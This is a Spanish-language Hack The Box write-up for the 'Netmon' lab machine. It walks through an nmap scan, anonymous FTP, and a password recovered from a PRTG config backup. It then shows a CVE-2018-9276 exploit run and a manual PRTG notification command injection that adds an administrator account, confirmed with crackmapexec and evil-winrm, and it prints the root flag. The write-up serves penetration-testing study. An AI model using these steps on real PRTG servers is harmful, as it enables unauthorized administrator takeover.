---
tags:
title: Netmon - Easy (HTB)
permalink: /Netmon-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---

# Reconocimiento

```bash
nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 01:10 EDT
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 53.85% done; ETC: 01:11 (0:00:15 remaining)
Nmap scan report for timelapse.htb (10.10.10.152)
Host is up (0.46s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-14T05:11:33
|_  start_date: 2025-10-14T05:08:16
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.02 seconds
```

# Service enumeration

### Port 21 FTP

```bash
ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:zs1n): anonymous       
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49854|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
```

Dentro de `\ProgramData\Paessler\PRTG Network Monitor` hay un archivo backup del servicio `paessler` que ademas es el servicio que se corre en el puerto `80` 

![1_GQbwU_meHVHxK5J2mYe8Fw](images/1_GQbwU_meHVHxK5J2mYe8Fw.webp)

Asi que nos descargamos ambos. Y vemos que dentro del `.old.bak` hay unas credenciales las cuales podemos usar en la web.

```xml
cat PRTG\ Configuration.old.bak | grep -A 20 '<dbpassword>'
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
              60
            </dbtimeout>
```
### Port 80

![Untitled 60 1](images/Untitled 60 1.jpg)

Una vez tenemos las credenciales intentamos loguearnos en la misma.

![1_x5myqvoh7q95szTRDH_hPA](images/1_x5myqvoh7q95szTRDH_hPA.webp)

Pero vemos que nos son validas.
Como sabemos que la contraseña tiene el año `2018` y la recolectamos del archivo viejo `(old)` podemos intuir que esta desactualizada un año, asi que podemos tratar ponerle `2019`. Y vemos que si logramos loguearnos.

![[Untitled 61 1.jpg]]

Anteriormente usando el framework de metasploit `searchsploit` vimos que existía un cve para este servicio, pero teníamos que estar autenticados así que podemos aprovecharlo, ya que el mismo una vez se logra ejecutar nos crea un usuario en el dominio con privilegios de `administrator`. Para eso tenemos que proporcionar la `ip` y las "`Cookies`" : `_ga` y `_gid` las cuales las podemos ver en la consola de la pagina.

![[Untitled 72.jpg]]

Y ahora ejecutamos el exploit.

```bash
./exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1441414331.1760419264; _gid=GA1.4.1346410907.1760419264; OCTOPUS1813713946=ezM0RTE0RDgxLUI5MkItNEY2RC04OTc0LUQwODA2QzAwNUU4NH0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

Vemos que si nos logueamos podemos ya visualizar la flag pero probemos el metodo manual.

## Manual method

Si nos dirigimos a la pestaña `setup/account settings` podemos crear una notificacion en la cual podemos usar un programa para enviarla como `.ps1` o `cmd.exe` en mi caso use `ps1`, le damos a crear una notificacion y le pasamos lo parametros que queremos ejecutar.

![[Untitled 62 1.jpg]]

En mi caso añadi un usuario con las credenciales `zs1n:lala123!$` y lo añado al grupo de `administrators`.

Una vez guardamos la notificacion para enviarla le damos al boton de `play`.

![[Untitled 70.jpg]]

Una ves le damos a play para enviar la notificación nos sale esta alerta.

![[Untitled 71.jpg]]

Haciéndonos saber que la notificación se ejecuto correctamente, por lo que podríamos chequear las credenciales y ver si efectivamente son validas.

```bash
crackmapexec smb 10.10.10.152 -u zs1n -p 'lala123!$' 
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\zs1n:lala123!$ (Pwn3d!)
```

Y vemos que si, asi que una ves viendo esto nos conectamos a la maquina con `evil-winrm`

```bash
evil-winrm -i 10.10.10.152 -u 'zs1n' -p 'lala123!$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\zs1n\Documents> whoami
netmon\zs1n
```

Y podriamos chequear si somos parte del grupo `administrator`

```powershell
*Evil-WinRM* PS C:\Users\zs1n\Documents> net user zs1n
User name                    zs1n
Full Name
Comment
User''s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/14/2025 2:44:55 AM
Password expires             11/25/2025 2:44:55 AM
Password changeable          10/14/2025 2:44:55 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

Y ya podemos visualizar la flag.

```powershell
*Evil-WinRM* PS C:\Users\zs1n\Documents> type ../../administrator/desktop/root.txt
cd7ce6e4850b3c2058ac50ee094a7cd9
```

`~Happy Hacking.`

